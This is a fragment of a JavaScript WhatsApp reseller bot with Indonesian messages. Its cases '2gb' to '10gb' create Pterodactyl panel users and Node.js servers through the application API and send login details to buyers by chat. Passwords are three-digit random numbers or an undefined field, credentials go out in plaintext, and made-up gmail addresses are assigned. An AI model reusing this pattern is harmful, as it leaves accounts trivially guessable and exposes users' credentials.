},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`_Sedang Membuat Server..._`)
let ctf = `*PANEL ANDA AKAN SEGERA DATANG* 

❏︎ ❄ Username: ${user.username}
❏ ︎☀ Password: ${password.toString()}
❏︎ ☁ Server: ${global.ownername}
❏︎ 📦 Link Login: ${global.domain}

Note Penting: 
❏ Dilarang Memberikan Data Panel Ke Orang Lain︎
❏ Dilarang Buat Panel Unlimited Terlalu Banyak
❏ Dilarang Untuk Ddos Server
❏ Dilarang Untuk Memberikan Link Login Server
❏ Dilarang Membuat Akun Admin Panel Lain

Simpan Data Dan Patuhi Peraturan Diatas`

await Line.sendMessage(u, { text: ctf, quoted: m });

let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`${monospace("PANEL CREATED")}

👤 *ID User*: ${user.id}
🆔 *UUID*: ${user.uuid}
📮 *Ram*: ${memo}
💿 *Disk*: ${disk}
💾 *Cpu*: ${cpu}%
📆 *Created At*: ${user.created_at}
📧 *Status*: *Berhasil✅*

*Data Berhasil Dikirim Ke Private Chat*`)
}
break

case '2gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split(',');
if (t.length < 2) return reply(`Contoh: ${prefix+command} Username,Nomor`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2150"
let cpu = "50"
let disk = "2150"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomNomor(100, 999) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`_Sedang Membuat Server..._`)
let ctf = `*PANEL ANDA AKAN SEGERA DATANG* 

❏︎ ❄ Username: ${user.username}
❏ ︎☀ Password: ${password.toString()}
❏︎ ☁ Server: ${global.ownername}
❏︎ 📦 Link Login: ${global.domain}

Note Penting: 
❏ Dilarang Memberikan Data Panel Ke Orang Lain︎
❏ Dilarang Buat Panel Unlimited Terlalu Banyak
❏ Dilarang Untuk Ddos Server
❏ Dilarang Untuk Memberikan Link Login Server
❏ Dilarang Membuat Akun Admin Panel Lain

Simpan Data Dan Patuhi Peraturan Diatas`
await Line.sendMessage(u, { text: ctf, quoted: m });
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`${monospace("PANEL CREATED")}

👤 *ID User*: ${user.id}
🆔 *UUID*: ${user.uuid}
📮 *Ram*: ${memo}
💿 *Disk*: ${disk}
💾 *Cpu*: ${cpu}%
📆 *Created At*: ${user.created_at}
📧 *Status*: *Berhasil✅*

*Data Berhasil Dikirim Ke Private Chat*`)
}
break

case '3gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split(',');
if (t.length < 2) return reply(`Contoh: ${prefix+command} Username,Nomor`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3150"
let cpu = "60"
let disk = "3150"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomNomor(100, 999) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`_Sedang Membuat Server..._`)
let ctf = `*PANEL ANDA AKAN SEGERA DATANG* 

❏︎ ❄ Username: ${user.username}
❏ ︎☀ Password: ${password.toString()}
❏︎ ☁ Server: ${global.ownername}
❏︎ 📦 Link Login: ${global.domain}

Note Penting: 
❏ Dilarang Memberikan Data Panel Ke Orang Lain︎
❏ Dilarang Buat Panel Unlimited Terlalu Banyak
❏ Dilarang Untuk Ddos Server
❏ Dilarang Untuk Memberikan Link Login Server
❏ Dilarang Membuat Akun Admin Panel Lain

Simpan Data Dan Patuhi Peraturan Diatas`
await Line.sendMessage(u, { text: ctf, quoted: m });
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`${monospace("PANEL CREATED")}

👤 *ID User*: ${user.id}
🆔 *UUID*: ${user.uuid}
📮 *Ram*: ${memo}
💿 *Disk*: ${disk}
💾 *Cpu*: ${cpu}%
📆 *Created At*: ${user.created_at}
📧 *Status*: *Berhasil✅*

*Data Berhasil Dikirim Ke Private Chat*`)
}
break

case '4gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split(',');
if (t.length < 2) return reply(`Contoh: ${prefix+command} Username,Nomor`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4150"
let cpu = "80"
let disk = "4150"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomNomor(100, 999) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`_Sedang Membuat Server..._`)
let ctf = `*PANEL ANDA AKAN SEGERA DATANG* 

❏︎ ❄ Username: ${user.username}
❏ ︎☀ Password: ${password.toString()}
❏︎ ☁ Server: ${global.ownername}
❏︎ 📦 Link Login: ${global.domain}

Note Penting: 
❏ Dilarang Memberikan Data Panel Ke Orang Lain︎
❏ Dilarang Buat Panel Unlimited Terlalu Banyak
❏ Dilarang Untuk Ddos Server
❏ Dilarang Untuk Memberikan Link Login Server
❏ Dilarang Membuat Akun Admin Panel Lain

Simpan Data Dan Patuhi Peraturan Diatas`
await Line.sendMessage(u, { text: ctf, quoted: m });
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`${monospace("PANEL CREATED")}

👤 *ID User*: ${user.id}
🆔 *UUID*: ${user.uuid}
📮 *Ram*: ${memo}
💿 *Disk*: ${disk}
💾 *Cpu*: ${cpu}%
📆 *Created At*: ${user.created_at}
📧 *Status*: *Berhasil✅*

*Data Berhasil Dikirim Ke Private Chat*`)
}
break

case '5gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split(',');
if (t.length < 2) return reply(`Contoh: ${prefix+command} Username,Nomor`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5150"
let cpu = "90"
let disk = "5150"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomNomor(100, 999) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`_Sedang Membuat Server..._`)
let ctf = `*PANEL ANDA AKAN SEGERA DATANG* 

❏︎ ❄ Username: ${user.username}
❏ ︎☀ Password: ${password.toString()}
❏︎ ☁ Server: ${global.ownername}
❏︎ 📦 Link Login: ${global.domain}

Note Penting: 
❏ Dilarang Memberikan Data Panel Ke Orang Lain︎
❏ Dilarang Buat Panel Unlimited Terlalu Banyak
❏ Dilarang Untuk Ddos Server
❏ Dilarang Untuk Memberikan Link Login Server
❏ Dilarang Membuat Akun Admin Panel Lain

Simpan Data Dan Patuhi Peraturan Diatas`
await Line.sendMessage(u, { text: ctf, quoted: m });
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`${monospace("PANEL CREATED")}

👤 *ID User*: ${user.id}
🆔 *UUID*: ${user.uuid}
📮 *Ram*: ${memo}
💿 *Disk*: ${disk}
💾 *Cpu*: ${cpu}%
📆 *Created At*: ${user.created_at}
📧 *Status*: *Berhasil✅*

*Data Berhasil Dikirim Ke Private Chat*`)
}
break

case '6gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split(',');
if (t.length < 2) return reply(`Contoh: ${prefix+command} Username,Nomor`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "6150"
let cpu = "100"
let disk = "6150"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomNomor(100, 999) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`_Sedang Membuat Server..._`)
let ctf = `*PANEL ANDA AKAN SEGERA DATANG* 

❏︎ ❄ Username: ${user.username}
❏ ︎☀ Password: ${password.toString()}
❏︎ ☁ Server: ${global.ownername}
❏︎ 📦 Link Login: ${global.domain}

Note Penting: 
❏ Dilarang Memberikan Data Panel Ke Orang Lain︎
❏ Dilarang Buat Panel Unlimited Terlalu Banyak
❏ Dilarang Untuk Ddos Server
❏ Dilarang Untuk Memberikan Link Login Server
❏ Dilarang Membuat Akun Admin Panel Lain

Simpan Data Dan Patuhi Peraturan Diatas`
await Line.sendMessage(u, { text: ctf, quoted: m });
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`${monospace("PANEL CREATED")}

👤 *ID User*: ${user.id}
🆔 *UUID*: ${user.uuid}
📮 *Ram*: ${memo}
💿 *Disk*: ${disk}
💾 *Cpu*: ${cpu}%
📆 *Created At*: ${user.created_at}
📧 *Status*: *Berhasil✅*

*Data Berhasil Dikirim Ke Private Chat*`)
}
break

case '7gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split(',');
if (t.length < 2) return reply(`Contoh: ${prefix+command} Username,Nomor`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "7150"
let cpu = "120"
let disk = "7150"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomNomor(100, 999) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`_Sedang Membuat Server..._`)
let ctf = `*PANEL ANDA AKAN SEGERA DATANG* 

❏︎ ❄ Username: ${user.username}
❏ ︎☀ Password: ${password.toString()}
❏︎ ☁ Server: ${global.ownername}
❏︎ 📦 Link Login: ${global.domain}

Note Penting: 
❏ Dilarang Memberikan Data Panel Ke Orang Lain︎
❏ Dilarang Buat Panel Unlimited Terlalu Banyak
❏ Dilarang Untuk Ddos Server
❏ Dilarang Untuk Memberikan Link Login Server
❏ Dilarang Membuat Akun Admin Panel Lain

Simpan Data Dan Patuhi Peraturan Diatas`
await Line.sendMessage(u, { text: ctf, quoted: m });
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`${monospace("PANEL CREATED")}

👤 *ID User*: ${user.id}
🆔 *UUID*: ${user.uuid}
📮 *Ram*: ${memo}
💿 *Disk*: ${disk}
💾 *Cpu*: ${cpu}%
📆 *Created At*: ${user.created_at}
📧 *Status*: *Berhasil✅*

*Data Berhasil Dikirim Ke Private Chat*`)
}
break

case '8gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split(',');
if (t.length < 2) return reply(`Contoh: ${prefix+command} Username,Nomor`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "8150"
let cpu = "140"
let disk = "8150"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomNomor(100, 999) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`_Sedang Membuat Server..._`)
let ctf = `*PANEL ANDA AKAN SEGERA DATANG* 

❏︎ ❄ Username: ${user.username}
❏ ︎☀ Password: ${password.toString()}
❏︎ ☁ Server: ${global.ownername}
❏︎ 📦 Link Login: ${global.domain}

Note Penting: 
❏ Dilarang Memberikan Data Panel Ke Orang Lain︎
❏ Dilarang Buat Panel Unlimited Terlalu Banyak
❏ Dilarang Untuk Ddos Server
❏ Dilarang Untuk Memberikan Link Login Server
❏ Dilarang Membuat Akun Admin Panel Lain

Simpan Data Dan Patuhi Peraturan Diatas`
await Line.sendMessage(u, { text: ctf, quoted: m });
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`${monospace("PANEL CREATED")}

👤 *ID User*: ${user.id}
🆔 *UUID*: ${user.uuid}
📮 *Ram*: ${memo}
💿 *Disk*: ${disk}
💾 *Cpu*: ${cpu}%
📆 *Created At*: ${user.created_at}
📧 *Status*: *Berhasil✅*

*Data Berhasil Dikirim Ke Private Chat*`)
}
break

case '9gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split(',');
if (t.length < 2) return reply(`Contoh: ${prefix+command} Username,Nomor`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "9150"
let cpu = "150"
let disk = "9150"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomNomor(100, 999) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`_Sedang Membuat Server..._`)
let ctf = `*PANEL ANDA AKAN SEGERA DATANG* 

❏︎ ❄ Username: ${user.username}
❏ ︎☀ Password: ${password.toString()}
❏︎ ☁ Server: ${global.ownername}
❏︎ 📦 Link Login: ${global.domain}

Note Penting: 
❏ Dilarang Memberikan Data Panel Ke Orang Lain︎
❏ Dilarang Buat Panel Unlimited Terlalu Banyak
❏ Dilarang Untuk Ddos Server
❏ Dilarang Untuk Memberikan Link Login Server
❏ Dilarang Membuat Akun Admin Panel Lain

Simpan Data Dan Patuhi Peraturan Diatas`
await Line.sendMessage(u, { text: ctf, quoted: m });
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`${monospace("PANEL CREATED")}

👤 *ID User*: ${user.id}
🆔 *UUID*: ${user.uuid}
📮 *Ram*: ${memo}
💿 *Disk*: ${disk}
💾 *Cpu*: ${cpu}%
📆 *Created At*: ${user.created_at}
📧 *Status*: *Berhasil✅*

*Data Berhasil Dikirim Ke Private Chat*`)
}
break

case '10gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split(',');
if (t.length < 2) return reply(`Contoh: ${prefix+command} Username,Nomor`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "10150"
let cpu = "190"
let disk = "10150"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomNomor(100, 999) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`_Sedang Membuat Server..._`)
let ctf = `*PANEL ANDA AKAN SEGERA DATANG* 

❏︎ ❄ Username: ${user.username}
❏ ︎☀ Password: ${password.toString()}
❏︎ ☁ Server: ${global.ownername}
❏︎ 📦 Link Login: ${global.domain}

Note Penting: 
❏ Dilarang Memberikan Data Panel Ke Orang Lain︎
❏ Dilarang Buat Panel Unlimited Terlalu Banyak
❏ Dilarang Untuk Ddos Server
❏ Dilarang Untuk Memberikan Link Login Server
❏ Dilarang Membuat Akun Admin Panel Lain

Simpan Data Dan Patuhi Peraturan Diatas`
await Line.sendMessage(u, { text: ctf, quoted: m });
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`${monospace("PANEL CREATED")}

👤 *ID User*: ${user.id}
🆔 *UUID*: ${user.uuid}
📮 *Ram*: ${memo}
💿 *Disk*: ${disk}
💾 *Cpu*: ${cpu}%
📆 *Created At*: ${user.created_at}
📧 *Status*: *Berhasil✅*

*Data Berhasil Dikirim Ke Private Chat*`)
}
break

case 'unli': {
